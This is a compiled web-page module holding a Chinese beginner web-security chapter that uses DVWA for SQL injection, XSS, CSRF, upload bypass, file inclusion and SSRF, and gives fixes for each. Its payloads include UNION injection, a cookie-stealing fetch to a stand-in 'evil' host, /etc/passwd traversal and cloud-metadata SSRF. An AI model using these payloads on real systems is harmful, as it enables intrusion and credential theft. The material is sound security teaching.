import{_ as i,o as a,c as t,a2 as e}from"./chunks/framework.BbQrW5_t.js";const g=JSON.parse('{"title":"Web 安全基础","description":"","frontmatter":{"title":"Web 安全基础","date":"2026-09-03T00:00:00.000Z","tags":["网络安全","初级"]},"headers":[],"relativePath":"study/cyber-security/chapters/初级篇/03-Web安全基础.md","filePath":"study/cyber-security/chapters/初级篇/03-Web安全基础.md","lastUpdated":1788493831000}'),l={name:"study/cyber-security/chapters/初级篇/03-Web安全基础.md"};function n(h,s,p,r,k,o){return a(),t("div",null,[...s[0]||(s[0]=[e(`<h1 id="_03-·-web-安全基础——owasp-逐项四步法" tabindex="-1">03 · Web 安全基础——OWASP 逐项四步法 <a class="header-anchor" href="#_03-·-web-安全基础——owasp-逐项四步法" aria-label="Permalink to &quot;03 · Web 安全基础——OWASP 逐项四步法&quot;">​</a></h1><blockquote><p>每个漏洞按固定节奏学：<strong>原理 → 手工利用 → DVWA 复现 → 修复视角</strong>。你写过 20 年 Web 代码，这一章你会不断出现&quot;原来我以前写的代码有这问题&quot;的瞬间——这就是攻击者视角开始生效的标志。</p></blockquote><h2 id="🎯-学习目标" tabindex="-1">🎯 学习目标 <a class="header-anchor" href="#🎯-学习目标" aria-label="Permalink to &quot;🎯 学习目标&quot;">​</a></h2><ol><li>Burp Suite 完成代理配置，抓改一次 HTTPS 请求</li><li>手工完成 DVWA SQL 注入 Low→Medium（不借助 sqlmap）</li><li>对 XSS/CSRF/上传/包含/SSRF 每种漏洞能画出&quot;利用数据流&quot;</li><li>每种漏洞对应说出 2-3 个开发者修复手段</li></ol><h2 id="📖-核心知识" tabindex="-1">📖 核心知识 <a class="header-anchor" href="#📖-核心知识" aria-label="Permalink to &quot;📖 核心知识&quot;">​</a></h2><h3 id="_3-0-burp-工作流-手术台搭建" tabindex="-1">3.0 Burp 工作流（手术台搭建） <a class="header-anchor" href="#_3-0-burp-工作流-手术台搭建" aria-label="Permalink to &quot;3.0 Burp 工作流（手术台搭建）&quot;">​</a></h3><ol><li>安装 Burp Community → Proxy 监听 127.0.0.1:8080</li><li>浏览器指向代理，访问 <a href="http://burp" target="_blank" rel="noreferrer">http://burp</a> 下载 CA 证书并信任（HTTPS 中间人的&quot;合法版&quot;）</li><li>核心动作：<strong>Intercept 拦截改包</strong> → <strong>Repeater 重放调试</strong> → <strong>HTTP history 回溯</strong></li></ol><h3 id="_3-1-sql-注入" tabindex="-1">3.1 SQL 注入 <a class="header-anchor" href="#_3-1-sql-注入" aria-label="Permalink to &quot;3.1 SQL 注入&quot;">​</a></h3><p><strong>原理</strong>：用户输入被拼接进 SQL 语句的<strong>代码上下文</strong>。本质和&quot;字符串进 eval&quot;同构——你最熟悉的错误。</p><p><strong>手工利用（DVWA Low，输入框输入 ID）</strong>：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">-- 正常：SELECT first_name,last_name FROM users WHERE id = &#39;1&#39;</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39; ORDER BY 2--+          -- 探列数：报错→列数不对；成功→至少2列</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">1&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> UNION</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> SELECT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> user(),</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">()</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">--+      -- 联合查询：当前库</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39; UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--+</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">1&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> UNION</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> SELECT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> user,</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">password</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> FROM</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> users</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">--+</span></span></code></pre></div><p>逐段解析：<code>1&#39;</code> 闭合原引号 → 注入新语法 → <code>--+</code> 注释掉尾部残余引号。<code>information_schema</code> 是 MySQL 的&quot;数据库地图&quot;——先看地图再拿数据。</p><p><strong>布尔盲注</strong>（页面无回显只有真/假两种状态）：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39; AND (SELECT SUBSTR(database(),1,1))=&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;--+   -- 逐字符猜解，自动化=写脚本循环</span></span></code></pre></div><p><strong>修复视角</strong>：参数化查询（预编译）是唯一根治；ORM 不等于免疫（拼接仍在）；最小权限 DB 账号；错误信息不回显。</p><h3 id="_3-2-xss-跨站脚本" tabindex="-1">3.2 XSS（跨站脚本） <a class="header-anchor" href="#_3-2-xss-跨站脚本" aria-label="Permalink to &quot;3.2 XSS（跨站脚本）&quot;">​</a></h3><table tabindex="0"><thead><tr><th>类型</th><th>注入位置</th><th>触发方式</th></tr></thead><tbody><tr><td>反射型</td><td>URL 参数回显</td><td>诱导点击构造链接</td></tr><tr><td>存储型</td><td>存入 DB 的内容（评论/昵称）</td><td>任何浏览者触发，<strong>危害最大</strong></td></tr><tr><td>DOM 型</td><td>前端 JS 处理 location/hash</td><td>纯前端，服务端日志无痕</td></tr></tbody></table><p>危害本质：<strong>在你域下以用户身份执行 JS</strong>——偷 Cookie（会话）、伪造请求、键盘记录。</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;http://evil/&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document.cookie)&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;   </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 教学示意：理解危害模型 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">img</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> src</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">x</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> onerror</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">alert</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">(</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">domain</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">)</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;               </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 标签被过滤时的常见绕过思路 --&gt;</span></span></code></pre></div><p><strong>修复视角</strong>：输出按上下文编码（HTML/属性/JS/URL 四种上下文编码不同）；CSP 响应头（<code>Content-Security-Policy</code>）；HttpOnly Cookie 让偷到的会话不可读；输入校验只是辅助，<strong>输出编码才是正解</strong>。</p><h3 id="_3-3-csrf-跨站请求伪造" tabindex="-1">3.3 CSRF（跨站请求伪造） <a class="header-anchor" href="#_3-3-csrf-跨站请求伪造" aria-label="Permalink to &quot;3.3 CSRF（跨站请求伪造）&quot;">​</a></h3><p><strong>原理</strong>：浏览器自动携带 Cookie 的机制 + 恶意站点的伪造请求 = &quot;借用户的身份发请求&quot;。与 XSS 的区别：CSRF 伪造请求但<strong>看不到响应</strong>；XSS 能读响应。</p><p><strong>防御</strong>：CSRF Token（随机值放表单+服务端校验）、SameSite Cookie（Lax/Strict）、关键操作二次确认。Referer 校验是弱防御（可被部分绕过）。</p><h3 id="_3-4-文件上传与解析漏洞" tabindex="-1">3.4 文件上传与解析漏洞 <a class="header-anchor" href="#_3-4-文件上传与解析漏洞" aria-label="Permalink to &quot;3.4 文件上传与解析漏洞&quot;">​</a></h3><p>绕过分类（DVWA 上传关的进阶思路）：</p><ul><li>前端校验 → 直接改包</li><li>MIME 校验 → 改 Content-Type</li><li>扩展名黑名单 → 双写/大小写/ <code>.php5</code>/<code>.phtml</code></li><li>内容检测 → 图片马（文件头 + GIF89a）</li><li>解析漏洞：Nginx <code>/x.jpg/.php</code>、IIS 分号截断（历史版本）</li></ul><p><strong>修复</strong>：白名单+重命名+存储与 Web 根隔离+不回显路径+二次渲染。</p><h3 id="_3-5-文件包含-lfi-rfi" tabindex="-1">3.5 文件包含（LFI/RFI） <a class="header-anchor" href="#_3-5-文件包含-lfi-rfi" aria-label="Permalink to &quot;3.5 文件包含（LFI/RFI）&quot;">​</a></h3><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">include</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">($_GET[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;page&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]);   </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 危险代码模式——认出这个模式就认出了漏洞</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">page</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">..</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">..</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">..</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">..</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">etc</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">passwd</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">      // 目录遍历</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">page</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">php</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">//filter/convert.base64-encode/resource=index.php</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 伪协议读源码</span></span></code></pre></div><p><strong>修复</strong>：白名单映射（page=about → 固定文件）、关闭 <code>allow_url_include</code>、open_basedir。</p><h3 id="_3-6-ssrf-服务端请求伪造" tabindex="-1">3.6 SSRF（服务端请求伪造） <a class="header-anchor" href="#_3-6-ssrf-服务端请求伪造" aria-label="Permalink to &quot;3.6 SSRF（服务端请求伪造）&quot;">​</a></h3><p><strong>原理</strong>：让<strong>服务器</strong>替你发请求——它在内网，你能到到平时够不着的 169.254.169.254（云元数据）、内网管理端。</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>?url=http://127.0.0.1:6379/   → 打内网 Redis</span></span>
<span class="line"><span>?url=file:///etc/passwd       → file 协议读文件（视实现）</span></span></code></pre></div><p><strong>修复</strong>：出站白名单、禁用非 http 协议、禁重定向、元数据服务加固（云上 IMDSv2）。</p><h2 id="🔬-动手实操" tabindex="-1">🔬 动手实操 <a class="header-anchor" href="#🔬-动手实操" aria-label="Permalink to &quot;🔬 动手实操&quot;">​</a></h2><p>DVWA 部署（docker 一行）：<code>docker run -d -p 80:80 vulnerables/web-dvwa</code> 顺序：SQL 注入 Low 手工 → Medium（引号过滤→数字型绕过思路）→ XSS 三关 → 上传/包含。每个关卡写 5 行笔记：payload + 为什么有效。</p><h2 id="⚠️-常见坑" tabindex="-1">⚠️ 常见坑 <a class="header-anchor" href="#⚠️-常见坑" aria-label="Permalink to &quot;⚠️ 常见坑&quot;">​</a></h2><ol><li>无脑 sqlmap——先手工，工具是手熟后的加速器</li><li>只会 DVWA 默认难度——Medium/High 的绕过才是真学习</li><li>把&quot;打中靶场&quot;当&quot;会了&quot;——能给别人讲清&quot;为什么有效&quot;才算会</li><li>修复视角偷懒——白帽子价值一半在&quot;怎么修&quot;</li><li>在非授权目标上&quot;顺手试试&quot;——红线在此</li></ol><h2 id="✅-自测题" tabindex="-1">✅ 自测题 <a class="header-anchor" href="#✅-自测题" aria-label="Permalink to &quot;✅ 自测题&quot;">​</a></h2><details><summary>1. 参数化查询为什么能根治 SQL 注入？</summary><p>SQL 结构与数据在协议层分离：输入永远作为数据（绑定参数）传输，不进入 SQL 解析器的代码上下文——无论输入什么都改变不了语句结构。</p></details><details><summary>2. HttpOnly 防得住 XSS 吗？</summary><p>防不住 XSS 本身，只防住&quot;偷 Cookie&quot;这一种后果。XSS 仍可代用户发请求、改页面。纵深防御：编码+CSP+HttpOnly 一起上。</p></details><details><summary>3. SameSite=Lax 能防全部 CSRF？</summary><p>不能。Lax 拦跨站 POST，但顶级导航 GET 仍带 Cookie；GET 型状态变更操作依然可被打。</p></details><details><summary>4. 为什么 SSRF 在云上危害骤增？</summary><p>云元数据服务（169.254.169.254）从内网可达且返回临时凭证——SSRF 打到它等于拿到云 API 权限（如获取角色 Token）。</p></details><details><summary>5. input 校验和 output 编码，哪个是 XSS 的正解？</summary><p>输出编码。输入校验降低风险但绕过场景多；XSS 的本质是&quot;数据进入代码上下文&quot;，在输出点按上下文编码才是根修。</p></details><h2 id="🔗-对应周任务与资源" tabindex="-1">🔗 对应周任务与资源 <a class="header-anchor" href="#🔗-对应周任务与资源" aria-label="Permalink to &quot;🔗 对应周任务与资源&quot;">​</a></h2><ul><li>对应计划：<strong>第1年 W09-W13</strong>；资源：PortSwigger Web Security Academy（免费）、《Web 安全深度剖析》、DVWA</li></ul>`,46)])])}const c=i(l,[["render",n]]);export{g as __pageData,c as default};
